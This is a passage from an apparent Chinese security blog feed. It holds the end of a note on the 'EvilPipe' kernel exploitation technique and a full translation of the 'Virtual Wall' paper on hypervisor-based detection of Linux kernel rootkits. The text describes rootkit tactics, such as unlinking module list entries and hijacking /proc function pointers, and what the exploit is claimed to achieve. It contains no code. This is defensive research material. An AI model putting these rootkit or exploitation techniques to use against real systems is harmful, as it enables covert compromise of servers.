系统下对多个 <code>（此处暂定）</code> 真实世界中的漏洞完成了对这种利用手法的评估。我们发现 EvilPipe 在多个 <code>（此处暂定）</code> 真实世界的漏洞上可以完成利用，这意味着这项技术具有强大的能力。在完成可利用性评估之后，我们提出了一种新的保护机制，通过在数据拷贝前添加额外的验证机制以防止 EvilPipe 类型的利用方法，经实验评估，我们所提出的新机制带来的负担是可以忽略不计的。</p><p>总而言之，本文做了如下工作：</p><ul><li>我们提出了一种新的通用利用技术——EvilPipe，这项技术允许我们将绝大多数的内核中的内存损坏漏洞（甚至仅是一个 ‘\0’ 字节的堆溢出），转换为无需任何特权的无限的对物理内存的任意读写能力</li><li>我们在多个真实世界的漏洞上应用了 EvilPipe ，这展示了其强大的通用性与易用性。同时我们发现了一些可能应用类似于 EvilPipe 的逻辑攻击手法的内核对象。</li><li>我们分析了 Linux 内核现有的防御机制在对抗逻辑漏洞上的不足，并提出了新的保护机制。我们对这项新机制进行了评估，发现其带来的负担是可以忽略不计的。</li></ul></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;「さらば、全てのリヌクス カーネル エクスプロイテーション。」&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://arttnba3.github.io/categories/CTF/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="https://arttnba3.github.io/tags/CTF/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="D^3CTF" scheme="https://arttnba3.github.io/tags/D-3CTF/"/>
    
    <category term="Heap Overflow" scheme="https://arttnba3.github.io/tags/Heap-Overflow/"/>
    
    <category term="Cross-Cache Overflow" scheme="https://arttnba3.github.io/tags/Cross-Cache-Overflow/"/>
    
    <category term="Page-level Heap Fengshui" scheme="https://arttnba3.github.io/tags/Page-level-Heap-Fengshui/"/>
    
    <category term="堆风水" scheme="https://arttnba3.github.io/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x02】论文笔记：Virtual Wall: Filtering Rootkit Attacks To Protect Linux Kernel Functions </title>
    <link href="https://arttnba3.github.io/2023/04/14/PAPER-0X02_VTW/"/>
    <id>https://arttnba3.github.io/2023/04/14/PAPER-0X02_VTW/</id>
    <published>2023-04-13T15:46:35.000Z</published>
    <updated>2023-10-20T17:43:39.166Z</updated>
    
    <content type="html"><![CDATA[<p>任何 rootkit，终将绳之以法！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者的毕业设计完成的要求之一便是需要完整翻译一篇与该领域相关的论文，刚好笔者做的是反病毒相关的，因此就选了<a href="https://ieeexplore.ieee.org/document/9186825">《Virtual Wall: Filtering Rootkit Attacks To Protect Linux Kernel Functions》</a>这篇论文</p><p>本篇博客说是论文笔记，其实就是<strong>一篇完整的论文翻译：）</strong></p><blockquote><p>不过在笔者翻译完之后才发现作者似乎是华人，<del>感觉有点亏了，毕竟主要是出于翻译的目的，但是却没能体会到原汁原味的 native speaker 的论文</del></p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>如今 Linux 服务器已被在几乎所有的云、数据中心与超级电脑上使用。Linux 内核功能正面临着一种称之为 <code>rootkits</code> 的带有 root 访问权限的恶意软件攻击。rootkits 在如今的 Linux 服务器上以 <em>可装载内核模块</em> （Loadable Kernel Modules，LKM）的形式出现。这些模块隐藏于其他的内核对象之间，且可以通过篡改内核服务函数所需的元数据来重定向内核控制流。内核 rootkits 在载入后对用户是不可见的，这可能绕过大部分的安全防护。rootkits 在时间与空间上的表现都是分散的，这使其变得难以被发现或移除。为了解决 rootkit 的威胁，我们提出了一种通用的 <em>虚拟墙</em> （Virtual Wall，VTW）方案以通过跟踪所带来的内核活动来过滤出嵌入了 rootkit 的 LKMs。这种 VTW 本质上是一个带有 rootkit 检测与时间追踪能力的轻量级 hypervisor。通常情况下 Linux 在 Guest 模式下运行，当一个 LKM 的执行损害了 VTW 所设置的安全策略时，OS 控制权将转换到 Host 模式，在 Host 模式的 VTW 及时地启用检测并跟踪 rootkit 事件。换言之，潜在的 rootkit 攻击会被检测、被追踪并被分类以做出有意义的过滤决策。整个检测与追踪过程基于内存访问控制与事件注入机制。实验性质的结果展示了 VTW 防护系统在及时检测与防御内核 rootkit 上是高效的，且执行 VTW 的 CPU 开销小于 2%。相较于其他的防护机制（如 DIKernel 等），我们的 vs 更容易以低性能开销应用于 Linux 服务器。我们还会将我们的系统与七个其他的 rootkit 防御系统进行对比。</p><p><strong>Index Terms</strong>——访问控制，数据完整性，操作系统安全，内核保护与系统架构。</p><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1 Introduction"></a>1 Introduction</h1><p>由于内核 rootkit 的高权限与因此特性，其被广泛应用于 Linux 服务器的内核攻击中。如今已知的内核 rootkits 大都以 <em>可装载内核模块</em> （Loadable Kernel Modules，LKM）的形式出现，这些模块可以重定义内核内容函数、隐藏自身并隐藏目标对象。</p><p>可隐藏的特性允许内核 rootkit 通过 “基于 host 的” 架构绕过安全工具。自从这些工具更低的权限限制了他们的检测范围，更糟糕的是他们基于 <em>目标操作系统</em> （target operating system，TOS）环境，这导致检测结果的可靠性必须基于 TOS 的完全安全。不幸的是，内核 rootkit 可以偷偷篡改 TOS 环境以破坏其安全。</p><p>为了实现他们的功能，内核 rootkit 需要篡改内核对象。内核 rootkit 的操作对象包括多种数据，例如控制数据、非控制数据、静态数据与动态数据。理论而言，内核安全可以通过限制所有对指定内核数据的窜改来确保。</p><p>然而，不同的数据通常在内核空间中分散存储，带有不同特性的数据可能会存放在同一张内存页中。因此，基于页的保护机制无法在不影响其他内核数据的情况下保护目标数据。</p><p>在攻击中，内核 rootkit 需要篡改的内核数据通常仅有几字节。同时，最小的内存权限管理粒度为一张页，其通常占用 4KB。也就是说，为了保护数个字节，我们需要限制所有可执行实体对目标数据所在页的写操作。</p><p>在数据大小与保护粒度间的不匹配破坏了其他内核对象的原始属性，这影响了相关的执行实体的功能与表现。例如，内核数据结构中的 VFS 函数指针条目通常为内核 rootkit 要篡改的目标数据。尽管该条目并不会被动态更新，与其共址的状态描述条目可能会在执行实体运行时被更新。若对状态描述的写权限被限制，则关联的执行条目将被影响。</p><p>内核 rootkit 有着所有的 LKM 特性，他们可以调用自定义函数或装载 rootkit 的导出函数以篡改内核数据。他们可以在装载时或是在他们生命周期的任何时刻启动一次攻击。因此，内核 rootkit 可以是任何将被或已被装载的 LKM，参与到一次攻击的内核 rootkits 便可能是一个或多个 LKMs。</p><p>从时间层面，内核 rootkit 的攻击时间是随机的；从空间层面，在一次攻击中的参与者是分散的。这两种特性使得内核 rootkit 的攻击事件难以预测、攻击的参与者难以追踪，这极大地影响了系统安全。</p><p>攻击开始时间的随机性使得基于单个或周期性的检测仅能达到时候检测的效果。当这些方法被执行时，内核 rootkits 的攻击可能已经完成了，甚至所有的 rootkits 都可能被移除了。结果便是，他们的检测与防护效果将被极大地影响。内核 rootkits 间的依赖关系使得攻击的形式更加多样化。</p><p>透过依赖关系，内核 rootkit 可以连接多个 LKMs 以用作内核攻击。现有的安全方案仅能检测当前攻击的直接发起者，但无法识别在整个攻击过程中的其他参与者。未被检测的攻击者将一直潜伏于操作系统中，等待条件成熟时再次发起攻击。</p><p>我们提出了一种内核 rootkit 过滤方法 VTW 以保护内核功能，例如系统调用表、内核只读对象、LKM 状态描述符、<code>&quot;proc&quot;</code> 文件函数指针、网络文件指针等。这种方法使用 Intel VMX 技术以将操作系统分为两种模式：“host” 与 “guest”。</p><p>跨过两种执行模式，我们为压紧内核 rootkits 创建了检测、预防、跟踪策略。本论文的主要贡献总结于如下四个技术层面：</p><p>1） 建立了一个轻量级的 hypervisor。其使用 Intel VMX 技术来重构系统执行模式，使得对内核资源的访问更能被检测到。</p><p>2） 建立了一个资源访问控制机制。其可以感知对目标内存访问的感知、限制、操控，且支持我们在 “guest” 模式下监控与控制执行路径。</p><p>3） 建立一个控制流跟踪机制。该机制支持跟踪不同 LKMs 的控制流跳转与返回。</p><p>4） 创建了一个检测、防护、跟踪内核 rootkits 的安全框架。通过上述架构与机制，内核 rootkits 攻击可以被检测与防护。这是第一次有一种跟踪单次攻击中所有参与的内核 rootkits 的方法被开发。</p><h1 id="2-Related-Previous-Work"><a href="#2-Related-Previous-Work" class="headerlink" title="2 Related Previous Work"></a>2 Related Previous Work</h1><p>由于其良好的抗干扰能力，基于虚拟化的内核保护方法已经受到了额外的关注。尤其是对内核 rootkits 而言，这些方法展示了出色的优点。他们可以被分为两种：入侵式方法与非入侵式方法，前者需要向 <em>目标虚拟机</em> （target virtual machine，VTW）注入额外的内容以获取所需信息而后者不需要。</p><p><em>侵入式方法</em> （Intrusive Methods）。由 Sebastion 最先提出的 X-TIER 将一个内核模块插入到目标虚拟机，接下来其通过模块来读取 TVM 数据结构以获取其状态信息。在这之后 X-TIER 通过 hypercall 将所需信息传递给 hypervisor。</p><p>SYRINGE 使用函数调用注入技术来在 TVM 外启用对 TVM 函数的调用，与此同时局部牧羊技术被用于检测控制流完整性。</p><p>Virtuoso 继续从控制逻辑的角度获取 TVM 状态信息。其在 TVM 中多次运行程序并提取相关指令与相关执行路径，之后生成内省代码所需的路径被翻译，最后 Virtuoso 将所有的信息翻译成可以在 TVM 外进行语义重构的代码。</p><p>X-TIER、SYRINGE、Virtuoso 通过分析物理内存并以其作为真实视角而获得语义视角。他们可以通过对比真实的语义视角与 TVM 的内部视角来找到隐藏的对象，如进程与文件。若存在一个隐藏对象，则他们断定 TVM 已经被破坏而一个内核 rootkit 可能存在于 TVM 中。VMST 在 rootkit 检测上使用同样的方法。</p><p><em>非入侵式方法</em> （Non-Intrusive Methods）。VMwatch 的第一步是获取 TVM 的内存，之后使用 TVM 的内核数据结构作为模板来理解内存所表示的操作性状态。</p><p>与 VMwatcher 不同，RTKDSM 为一个实时系统，其可以被分为两部分：内省代理与监控代理，前者放置在一个安全的虚拟机中，后者则放置在 hypervisor 中。RTKDSM 可以通过交叉对比来对数据结构进行实时监控。</p><p>上述方法可以被用以检测被内核 rootkits 隐藏的对象，然而这些方法基于如 Xen 的巨型虚拟化平台，且需要克服虚拟机内省的语义缺陷。结果便是，他们向操作系统引入了一个显著的性能开销。</p><p>例如，RTKDSM降低了一些应用 110% 的执行速度。SYRING 在系统调用上延迟到 51ms，这对系统调用而言是一个显著的性能开销。除了 RTKDSM，没有任何的上述方法可以实时监控与检测操作系统。</p><h1 id="3-Virtual-Wall-Architecture"><a href="#3-Virtual-Wall-Architecture" class="headerlink" title="3 Virtual Wall Architecture"></a>3 Virtual Wall Architecture</h1><p>VTW 是一个带有内核 rootkit 防护功能的轻量级 hypervisor。本节我们将介绍其总体架构。</p><h2 id="3-1-Assumptions-and-Notational-Definition"><a href="#3-1-Assumptions-and-Notational-Definition" class="headerlink" title="3.1 Assumptions and Notational Definition"></a>3.1 Assumptions and Notational Definition</h2><p>我们假设攻击者可以将一个 LKM 注入到 TOS 中。现实中，攻击者可以通过应用漏洞提高权限并通过后门来控制 TOS，之后一个 LKM 可以被注入到内核。我们同样假设 TOS 与非恶意执行实体不会非法篡改内核数据与内核控制流。此外，本论文所用定义展示于表 1 中。</p><h2 id="3-2-Design-Objectives"><a href="#3-2-Design-Objectives" class="headerlink" title="3.2 Design Objectives"></a>3.2 Design Objectives</h2><p>VTW 被设计为带有如下指定的三个技术需求：</p><p>1） <em>实时检测</em> （Real-time Detection）。内核 rootkits 可能在模块加载阶段启动一次攻击，或是在模块位于内存中的时间中的任何时间。若检测在 LKM 被载入后或被移除后完成，则检测结果可能不精确，浙江影响后续的检测与追踪。因此，VTW 需要在模块载入完成前或在其生命周期中检测 rootkits 的有害操作以保护内核数据的完整性。</p><p>2） <em>高效防护</em> （Effective Defence）。rootkits 操作的内核对象包括静态与动态的内核数据。对于静态内核数据，VTW 需要确认他们未被篡改。对于动态内核数据，VTW 需要确保他们在被篡改后可以被恢复。</p><p>3） <em>综合可追踪性</em> （Comprehensive Traceability）。攻击代码可能在 rootkit 所属内存空间中，也可能在 rootkit 所依赖的其他模块的代码空间中。VTW 需要定位所有与当前有害操作相关的 LKMs。</p><h2 id="3-3-System-Architecture-of-Virtual-Wall"><a href="#3-3-System-Architecture-of-Virtual-Wall" class="headerlink" title="3.3 System Architecture of Virtual Wall"></a>3.3 System Architecture of Virtual Wall</h2><p>VTW 的防护过程如 图.1 所示。防御模式需要通过初始化来建立，之后应用访问控制方案，最后同时连带完成检测与跟踪以在 rootkit 过滤中进行高速决定。</p><p><img src="https://s2.loli.net/2023/04/06/XyHTQfdiP9YZk7S.png" alt="图.1 virtual wall 操作过程"></p><p>VTW 的架构如 图.2 所示。VTW 由 ModeHandler、MemHandler、ControlHandler、SPE（Security Policy Engine，安全策略引擎）组成。ModeHandler 的任务是确保在 “guest” 与 “host” 模式之间的正常模式切换。</p><p><img src="https://s2.loli.net/2023/04/06/ZrhVFxDmM3gERbI.png" alt="图.2 VTW 防护系统架构"></p><p>MemHandle 的任务是通过建立一组独立的地址页表来从 “guest” 上隔离安全内容物。此外，其借用 EPT （译注：Extend Page Table，扩展页表）来实现 VTW 的自我防护与透明部署。ControlHandler 完成 rootkit 的检测、预防、分析。</p><p>SPE 为每个内容物提供安全策略，例如为静态内核数据提供权限设置、为动态内核数据提供合法性约束、为控制流提供追踪路径。所有对 SPE 的损坏都将导致操作系统从 “guest” 陷入 “host”。</p><h3 id="3-3-1-Resetting-of-OS’s-Privilege-Mode"><a href="#3-3-1-Resetting-of-OS’s-Privilege-Mode" class="headerlink" title="3.3.1 Resetting of OS’s Privilege Mode"></a>3.3.1 Resetting of OS’s Privilege Mode</h3><p>ModeHandler 使用 Intel VMX Non-Root 与 Intel VMX Root 来将原生操作系统分为 “guest” 与 “host” 模式。这两种模式将 ring0 分为两个特权级，称为完全型 ring0 与限制型 ring0。在 “host” 模式下，VTW 位于完全型 ring0 级，可以完全接管内核控制流。在 “guest” 模式下，内核位于限制型 ring0 级，任何损坏 SPE 的行为都将造成操作系统陷入到 “host” 模式。</p><p>在 图.3 中，ProtectionWall为 ModeHandler 与 MemHandler 的功能属性的抽象，KernelProtector 为 ControlHandler 的功能属性的抽象。</p><p>若 guest 模式下的一条指令会损坏安全策略，则其将造成操作系统切换到 host 模式。ProtectionWall 将拒绝所有在 guest 模式下的操作并唤醒 KernelProtector 使用 SPE 处理该攻击。</p><p><img src="https://s2.loli.net/2023/04/06/Qt4skOVGPNJcLS2.png" alt="图3. Linux 内核操作中在 guest 与 host 模式间的条件跳转"></p><h3 id="3-3-2-Creating-Private-Page-Tables"><a href="#3-3-2-Creating-Private-Page-Tables" class="headerlink" title="3.3.2 Creating Private Page Tables"></a>3.3.2 Creating Private Page Tables</h3><p>MemHandler 为 host 创建一组私有页表以分割两种模式的地址空间，私有页表的创建条件如 表2 所示。</p><p>存储与内核数据段中的内核数据 $swapper_pg_dir$ 指向内核地址空间的页目录，所有执行实体的内核地址空间基于 $swapper_pg_dir$ 构建。在 表2 中，所有私有页表组成一个元组 $\rho$  ，且所有由 $swapper_pg_dir$ 指向的页表组成一个元组 $\varepsilon$ （①~②）。</p><p>当 MemHandler 被初始化，其会根据 $\varepsilon$ 创建页目录表（$h_pml4e$）、页顶级目录（$h_pdpte$）、页中间目录（$h_pde$）、页表（$h_pe$）。</p><p>我们首先基于页表集 $\rho$ （③）的内存 $V_{22}$ 创建一份等量的内存 $V_{1}$ ，接下来我们使用每个 $h_pdpte$ 的物理内存填充 $h_pml4e$ 的条目、使用每个 $h_pde$ 的物理内存填充 $h_pdpte$ 的条目、使用每个 $h_pe$ 的物理内存填充 $h_pde$ 的条目。</p><p>最后，MemHandler 拷贝 $\varepsilon$ 的最后的页表中所有的页条目至 $h_pe$ 。当 “host” 中出现一个页表错误时，VTW 根据 $\varepsilon$ 更新错误的页表。</p><p>为了确保 VTW 的透明性，MenHandler 建立了一种 EPT 重定向方法，该方法使得 VTW 的内容对 “guest” 而言是不可见的。其根据 VTW 的每个内容物的物理内存重定向 EPT 的页表项至一个被设为可读、可写、可执行（⑧~⑩）的空页。当 “guest” 中的实体想要访问 VTW 的物理内存时，被访问的内存为一个 <em>“$伪页$”</em> （pseudo page）。</p><p>由于整个内核共享一个相同的地址空间，每个执行实体可以映射包括 VTW 在内的所有内核内容。因此，VTW 不需要任何过程便能被检测与分析。若我们仅仅删除了寻址 VTW 的 EPT 条目，则当一个实体探索内核地址空间时，操作系统将不断地陷入 “host”。</p><p>一方面，频繁的陷入将影响执行效率；另一方面，异常的内存访问时间与空间将使得攻击者推断出 VTW 的存在。将 VTW 的所有地址空间重定向至伪物理页面可以排除由内存探测造成的时间与空间异常，这增强了 VTW 的透明性。</p><h1 id="4-Resource-Access-Control"><a href="#4-Resource-Access-Control" class="headerlink" title="4 Resource Access Control"></a>4 Resource Access Control</h1><p>VTW 通过 MemHandler 控制内存访问。MenHandler 使用 EPT 来控制 “guest” 模式中的内存访问。通过 EPT 提供的内存权限管理，我们可以感知、跟踪、控制 “guest” 对所有内存页面的访问。MenHandler 可以非常简便地通过设置 EPT 最后一级的权限位来部署。</p><p>为了达成对内核更细粒度的访问控制，ControlHandler 建立了一个包括设置断点、注入通用保护异常、执行单步调试的事件注入机制。我们将在本节描述这些，并展示于 表3 与 “资源访问控制过程”（Resource Access Control Procedure）。</p><h2 id="4-1-Conditioning-for-Resource-Access-Control"><a href="#4-1-Conditioning-for-Resource-Access-Control" class="headerlink" title="4.1 Conditioning for Resource Access Control"></a>4.1 Conditioning for Resource Access Control</h2><p>表3 为设置资源访问控制的条件。①<del>⑨用于设置断点，断点的类型可以依据目标对象分为指令与数据断点。ControlHandler 使用 Dr0</del>Dr3（断点地址寄存器于集合 $DeReg$ 中）与 DR6<del>DR7 （断点管理寄存器，于集合 $DeCon$ 中）来设置不同类型的断点（①</del>②）。</p><p>在设置一个指令断点时，首先通过函数 $SetDeReg$ 将指令地址（ $Iaddr$ ）写入到断点地址寄存器（③），接下来 Dr7 对应的 R&#x2F;W 位被设置为 01（数据写中断），对应的 LEN 位被设置为 10 （数据大小为 8 字节），如 ⑦<del>⑧所示。在完成断点设置之后，ControlHandler 同样需要清除 Dr6 （⑨）的 B0</del>B2 （位 2:0)。</p><p>为了控制 “guest” 的执行，ControlHandler 为操作系统设置单步执行调试。ControlHandler 首先读取 VMCS 中 guest 状态域中的 EFLAGS 的内容，记录目标信息（⑬）。接下来其将 EFLAGS.TF （陷阱标志位）设置为1（⑭），这将处理器设为单步执行模式。最后，ControlHandler 将修改后的内容再次写入 EFLAGS。最后 Dr6 的 BS（位 14）被设为 0。</p><h2 id="4-2-Resource-Access-Control-Procedure"><a href="#4-2-Resource-Access-Control-Procedure" class="headerlink" title="4.2 Resource Access Control Procedure"></a>4.2 Resource Access Control Procedure</h2><p>该程序用以控制指令执行与数据访问。步骤 1<del>4用以获得断点，步骤 5</del>6 用以堵塞 “guest” 中的目标指令，步骤 7~8 用以在执行目标指令后获取操作系统的状态。</p><p><img src="https://s2.loli.net/2023/04/08/OVLpw5DtBHcr4PJ.png" alt="image.png"></p><p>当一个执行实体像一个断点位置写入数据（步骤1<del>2）或是在 “guest” 模式下执行一个断点指令（步骤 3</del>4），其会触发到 “host” 模式的模式切换（$SysMod$）。Dr6 中的 B0 ~ B2 被用以区分断点的位置。通过设置断点，VTW 实现了字节级别的资源访问。</p><p>当一个通用保护被设置，运行在 “guest” 模式下的操作系统将生成一个 #GP 异常，由此当前操作将会被阻塞（步骤 5~6）。当单步调试启用，操作系统将在 “guest” 下执行任意指令后触发一个调试异常并陷入到 “host” （步骤 7 ~ 8 ）。通过设置单步调试，我们可以为操作系统实现指令粒度的资源访问控制，并通过 $get_status$ 获得由每条指令所造成的对操作系统状态的改变。</p><h1 id="5-Rootkit-Defense-Strategies"><a href="#5-Rootkit-Defense-Strategies" class="headerlink" title="5 Rootkit Defense Strategies"></a>5 Rootkit Defense Strategies</h1><p>我们依据攻击时间将内核 rootkits 的攻击分为三类。第一类中 rootkits 在加载时攻击内核，其会通过 $module_init()$ 调用特定函数以实现他们的攻击。</p><p>内核 rootkits 的有害行为可能在以上三类攻击中的其一或数个中出现，同时与当前攻击所关联的 rootkit(s) 可能会是正在被加载的 LKM、已加载的 LKM，抑或两者都是。</p><p>VTW 决定一个 LKM 是否为一个内核 rootkit。对于内核 rootkits，VTW 通过阻塞他们的破坏行为并恢复被破坏的数据来对抗他们。rootkit 检测方法如 “Rootkit 攻击检测” 所示，条件设置展示于 表4 中。该方法可以被用以预检测静态与动态的内核对象。</p><p><img src="https://s2.loli.net/2023/04/08/pX1lVcQrSfg5wiK.png" alt="image.png"></p><p><em>Rootkit 攻击检测</em> （Detection of Rootkit Attacks）。其被用以检测内核 rootkit 并保护内核不被摧毁。步骤 1 ~ 5 用于静态内核对象保护，步骤 6 ~ 8 用于隐藏检测，步骤 9 ~ 11 用于动态内核对象保护。</p><p><img src="https://s2.loli.net/2023/04/08/PvFmjXe2TyQLi4K.png" alt="image.png"></p><h2 id="5-1-Static-Kernel-Object-Protection"><a href="#5-1-Static-Kernel-Object-Protection" class="headerlink" title="5.1 Static Kernel Object Protection"></a>5.1 Static Kernel Object Protection</h2><p>静态内核对象（$\mu$ 与 $\xi$）在操作系统中保持不被改变。特定的内核控制流执行路径与一些重要的数据被存放于静态内核对象中。内核 rootkits 可以通过破坏静态内核对象的完整性来达成他们的恶意目的。</p><p>为了保护静态内核对象（如操作系统代码段、数据段、系统调用表等），VTW 通过分析文件 $”System.map”$ 或从内核代码段提取以获得他们的线性地址，并将其翻译为物理地址。</p><p>之后，VTW 设置标识这些物理地址的 EPT 条目（$\zeta$）的写权限为 “不可写”（表4 中的 ④ ~ ⑤）。在 “guest” 模式中，对静态内核对象的写操作（$WriteTo$）将触发 “EPT violation” 造成操作系统陷入到 “host” （“Rootkit 攻击检测” 中的 步骤 1）。接下来，VTW 注入一个 #GP 异常（$InjectGP$） 到 “guest” 中以预防 LKM 摧毁内核数据（步骤 2）。</p><p>需要注意的是最小的内存保护粒度为一张 “页”。然而并非所有的静态内核对象都占用完数个页，因此当一个 “EPT 损坏” 异常被抛出，VTW 首先确认异常地址是否属于被保护对象的地址范围。</p><p>若是，则当前操作会被阻塞，若否，则 VTW 将设置 “guest” 为单步执行模式（步骤4 中的 $SingleStep$ ）。接下来其将页设置为 “可写的” （步骤 5）。最后 VTW 将操作系统切换回 “guest” 模式以完成后续的写入。在这之后，操作系统重新陷入 “host”，VTW 通过函数 $OpenWrite$ 将页恢复到 “不可写” 。</p><h2 id="5-2-Dynamic-Kernel-Object-Protection"><a href="#5-2-Dynamic-Kernel-Object-Protection" class="headerlink" title="5.2 Dynamic Kernel Object Protection"></a>5.2 Dynamic Kernel Object Protection</h2><p>内核 rootkits 可以通过篡改动态内核数据来达成如劫持控制流的恶意目的。被篡改的内核数据包括控制数据与非控制数据，前者指的是指向内核控制流的指针。</p><p>这些指针通常被用于构造语义视角，例如存储于 $”proc”$ 文件系统中的函数指针。后者则指某些状态描述符中的一些条目，如 $”struct module”$ 中的条目 $”prev”$ 与 $”next”$。</p><p>实时更新的内核数据与被 rootkits 篡改的目标数据可能会存放在同一张页中，因此我们无法通过限制内存页的写权限来预防内核 rootkits 篡改内核数据。</p><p>此外，攻击时间的随机性使得实时检测篡改操作变得困难。面对这些问题，VTW 跟踪 LKMs 的执行，并在 LKM 追踪中检测动态内核数据。</p><h3 id="5-2-1-Hidden-Kernel-Detection"><a href="#5-2-1-Hidden-Kernel-Detection" class="headerlink" title="5.2.1 Hidden Kernel Detection"></a>5.2.1 Hidden Kernel Detection</h3><p>自我隐藏是内核 rootkit 的基本特性，隐藏行为可以被作为判断一个 LKM 是否为一个 rootkit 的标准。通常情况下，内核 rootkits 在初始化时实现自我隐藏。</p><p>因此，VTW 需要在其初始化完成之前检测其是否被隐藏。为了追踪模块初始化，我们在 $sys_init_module()$ 设置了一个指令断点并监控 LKM 的状态改变。当状态被切换到 $MODULE_STATE_LIVE$ 时，VTW 会检查模块是否被隐藏。内核 rootkits 通过从链表上移除他们的状态描述符来破坏与其他对象的逻辑连接以进行隐藏，LKMs 之间的逻辑连接可以被用来确认模块是否被隐藏。</p><p>$\mathscr{M}$c 为 LKM 正在被装载，$\mathscr{M}$p 为被$\mathscr{M}$c 中的条目 $prev$ 指向的模块，$\mathscr{M}$n 为被 $\mathscr{M}$c 中条目 $next$ 所指向的模块（表4 中的 ⑦~⑧）。若模块 $\mathscr{M}$c 与其相邻节点并不存在链表连接关系（“Rootkit 攻击检测” 中的步骤 6 ），或连接关系不完整（步骤 7 ~ 8），则我们判断 模块 $\mathscr{M}$c 被隐藏了。</p><h3 id="5-2-2-Dynamic-Kernel-Data-Detection"><a href="#5-2-2-Dynamic-Kernel-Data-Detection" class="headerlink" title="5.2.2 Dynamic Kernel Data Detection"></a>5.2.2 Dynamic Kernel Data Detection</h3><p>除了状态描述符外，内核 rootkits 还会篡改带有控制属性的内核数据以进行内核控制流重定向。在重定向前这类内核数据又指向内核代码段的指针组成，内核 rootkits 重写指针以重定向到他们的自定义代码。</p><p>被重定向的对象主要包括多种用于构建操作系统语义视角的操作函数。$”proc”$ 文件系统中的函数指针（例如 $lookup$）对内核 rootkits 而言为最脆弱的对象，因此有必要保护这些函数指针不被篡改。</p><p>为了隐藏网络连接（例如网络端口），内核 rootkits 还会攻击  $”&#x2F;proc&#x2F;net&#x2F;tcp”$、$”&#x2F;proc&#x2F;net&#x2F;tcp6”$ 、$”&#x2F;proc&#x2F;net&#x2F;udp”$ 、$”&#x2F;proc&#x2F;net&#x2F;udp6”$ 中的数据，因此这些文件描述符中的函数指针同样需要被保护。</p><p>除了上述内核对象，VTW 还要将如 $”root”$ 与 $”log”$ 这样关键文件的函数指针作为保护对象。所有的函数指针与他们的存储地址可以在 VTW 初始化中通过特定的数据结构（如 $f_dentry-&gt;d_inode-&gt;i_op-&gt;lookup$）从内存中提取。</p><p>所有被提取的数据形成一个集合 $k$ ，$k$ 中所有的动态内核数据指向固定的内核函数且不需要被更新。仅当我们发现一个新的内核 rootkit 修改一个不在 $k$ 中的某些内核数据时我们才扩展 $k$。此外，VTW 通过 EPT 将 $k$ 设置为读写保护，并禁止 “guest” 中的执行实体访问 $k$ 以保护他。</p><p>现在 $k$ 占用大概 64KB 的内存且包含 4000 份内核数据，其将根据新 rootkits 的突发情况而增长。在实战中，现有的内核 rootkits 通常修改不超过 500 份内核数据。我们将范围扩大以进行更好的保护。</p><p>$k$ 中的每个元素 $D$ 对应一个独特的内核对象（表 4 中的 ⑨）。元素 $D$i 作为二元数据对 （$a$i，$c$i）存在，$a$i 表示被保护的数据的地址，$c$i 则表示数据内容（⑩）。X 为内核代码范围$s \sim _\mathscr{e}$ （⑪）的范围。</p><p>在 LKM 的执行中，VTW 会检测地址 $a$i 上的内核数据 $c$i$’$ 是否指向内核代码段（⑫）。若存在 $c$i 并不指向内核代码段，则其可以确认内核控制流被重定向了（“Rootkit 攻击检测” 中的 10）。在检测到被篡改的内核数据 $c$i$’$ 后，VTW 读取在 $D$i 中保存的  $c$i 并将其写入到 $D$i.$a$i （步骤 11）。之后被篡改的内核数据恢复到了其初始值。</p><p>与内核 rootkits 不同，合法的 LKMs 不会修改状态描述符以进行自我隐藏，也不会修改带有系统函数指向特性的扩展数据以进行控制流重定向。</p><p>此外，我们保护动态内核数据的方法为在 LKM 执行的特定阶段检查被保护数据的完整性（例如调度与跳转），而非限制所有执行实体对属于内核数据的数据结构的访问。结果便是 VTW 可以从所有的 LKMs 中识别出 rootkits 且不会影响到其他 LKMs 的执行。</p><h2 id="5-3-Bypassing-Resistance-of-VTW-Effects"><a href="#5-3-Bypassing-Resistance-of-VTW-Effects" class="headerlink" title="5.3 Bypassing Resistance of VTW Effects"></a>5.3 Bypassing Resistance of VTW Effects</h2><p>以 VTW 的加载时间作为分界点，LKMs 可以被分为已被装载的 LKMs 与未被装载的 LKMs。当 VTW 被成功加载后，其可以及时监控并控制所有未被装载的 LKMs 的装载与执行，使其无法绕过检测。</p><p>对于在 VTW 载入前被装载的 LKMs，VTW 无法在 “host” 模式下常规地检测与跟踪，因为这会提高绕过 VTW 的风险。</p><p>有两个解决该问题的方法。其一是将 VTW 设为开机时启动，这样绝大部分的 LKMs 都会被包含在监控范围内，然而这种办法对于那些同样在开机时启动的 LKMs 而言仍是无效的。</p><p>第二种方法便是使用内核完整性检查的办法来定位有害的 LKM。被重定向的控制流属于 rootkits，可以通过将 LKM 列表中的控制流地址（$mal_addr$）与每个代码段（$module-&gt;core,module-&gt;core+module-&gt;core_size$）进行配对以确定 rootkit 是否已被隐藏。若是，$mal_addr$ 将被作为定位隐藏 LKM 的起始点。过程如 图.4 所示。</p><p><img src="https://s2.loli.net/2023/04/08/ZY8sMaE7ehj2BSH.png" alt="图.4 定位隐藏的“struct module”"></p><p>LKM 的代码段与数据段在虚拟空间中是连续的，他们的最后一级页表项是相邻的。因此，通过使用他们之间不同的可执行性（最后一级页表项的 NX 位），代码段的末尾地址（$code_end$）与数据段的起始地址（$data_start$）可以被识别。</p><p>在这之后，我们使用数据段的读写权限（最后一级页表项的 RW 位）来获得可写数据段的起始地址（$writable_data_start$）。LKM 的状态描述符（$struct\ module$）便存放在可写数据段中。</p><p>根据 LKM 